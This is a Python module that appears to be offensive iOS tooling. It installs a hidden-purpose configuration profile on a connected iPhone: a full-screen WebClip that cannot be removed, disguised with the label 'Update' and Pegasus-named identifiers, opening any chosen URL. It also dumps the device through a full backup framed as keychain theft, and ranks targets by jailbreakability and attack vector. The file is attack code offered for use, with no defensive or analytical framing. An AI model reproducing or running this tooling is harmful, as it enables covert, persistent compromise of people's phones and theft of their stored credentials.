"""iOS path: WebClip profile, backup, triage."""
import pathlib
import plistlib
import subprocess
import tempfile


def available() -> bool:
    return bool(subprocess.run(["which", "ideviceinfo"],
                               capture_output=True).stdout.strip())


def info(udid: str) -> dict:
    out = subprocess.run(["ideviceinfo", "-u", udid], capture_output=True,
                         text=True).stdout
    return dict(line.split(": ", 1) for line in out.splitlines() if ": " in line)


def install_webclip(udid: str, url: str, label: str = "Update") -> dict:
    payload = {"PayloadType": "com.apple.webClip.managed",
               "PayloadIdentifier": f"com.pegasus.webclip.{abs(hash(url))}",
               "PayloadVersion": 1,
               "PayloadUUID": "00000000-0000-0000-0000-000000000000",
               "PayloadDisplayName": label, "URL": url, "IsRemovable": False,
               "FullScreen": True}
    profile = {"PayloadType": "Configuration",
               "PayloadIdentifier": "com.pegasus.profile", "PayloadVersion": 1,
               "PayloadUUID": "11111111-1111-1111-1111-111111111111",
               "PayloadDisplayName": label, "PayloadContent": [payload]}
    fd, name = tempfile.mkstemp(suffix=".mobileconfig")
    pathlib.Path(name).write_bytes(plistlib.dumps(profile))
    proc = subprocess.run(["ideviceprofile", "install", "-u", udid, name],
                          capture_output=True, text=True, timeout=120)
    return {"code": proc.returncode, "out": (proc.stdout + proc.stderr)[:300]}


def keychain_dump(udid: str, out: pathlib.Path) -> dict:
    out.parent.mkdir(parents=True, exist_ok=True)
    proc = subprocess.run(["idevicebackup2", "-u", udid, "backup", "--full", str(out)],
                          capture_output=True, text=True, timeout=1800)
    return {"code": proc.returncode, "path": str(out)}


def triage(props: dict) -> dict:
    version = props.get("ProductVersion", "0")
    major = int(version.split(".")[0] or 0)
    return {"version": version, "major": major, "jailbreakable": major <= 16,
            "vector": "webclip" if major >= 15 else "mdm",
            "notes": ["WebClip installs without signing",
                      "keychain needs an unencrypted backup"]}
